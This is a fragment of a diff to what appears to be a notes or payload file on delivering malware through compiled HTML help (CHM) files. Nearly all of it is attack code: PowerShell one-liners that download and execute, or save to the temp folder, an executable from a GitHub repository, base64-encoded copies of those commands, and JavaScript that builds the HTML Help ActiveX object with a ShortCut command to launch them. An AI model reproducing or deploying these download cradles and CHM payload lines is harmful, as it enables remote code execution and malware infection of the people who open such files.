@@ -8,10 +8,10 @@ https://blog.rootshell.be/2017/12/19/malware-delivered-via-compiled-html-help-fi
 
 https://github.com/kobezt08/test/blob/master/bitsgdosutil.exe
 iex (new-object net.webclient).downloadstring('https://github.com/kobezt08/test/raw/master/bitsgdosutil.exe')
-
 aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwczovL2dpdGh1Yi5jb20va29iZXp0MDgvdGVzdC9yYXcvbWFzdGVyL2JpdHNnZG9zdXRpbC5leGUnKQ==
 
-
+(new-object net.webclient).downloadfile('https://github.com/kobezt08/test/raw/master/bitsgdosutil.exe', $env:temp + '\bitsgdosutil.exe')
+KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRmaWxlKCdodHRwczovL2dpdGh1Yi5jb20va29iZXp0MDgvdGVzdC9yYXcvbWFzdGVyL2JpdHNnZG9zdXRpbC5leGUnLCAkZW52OnRlbXAgKyAnXGJpdHNnZG9zdXRpbC5leGUnKQ==
 
 document.write('<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>');
  document.write('<PARAM name="Command" value="ShortCut">');
